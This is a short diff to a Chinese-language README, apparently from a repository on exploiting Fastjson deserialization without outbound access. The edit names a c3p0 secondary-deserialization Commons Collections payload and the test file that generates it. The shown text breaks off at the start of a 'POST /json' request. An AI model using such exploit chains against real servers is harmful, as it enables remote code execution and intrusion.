@@ -31,7 +31,7 @@ fastjson不出网回显利用
 回显方法：https://blog.csdn.net/fnmsd/article/details/106890242
 
 
-通过c3p0 二次反序列化 cc payload
+通过c3p0 二次反序列化 cc payload , payload 生成使用 `/fastjson-c3p0/blob/master/src/test/java/com/fastjson/vul/Test.java`
 
 ```
 POST /json HTTP/1.1
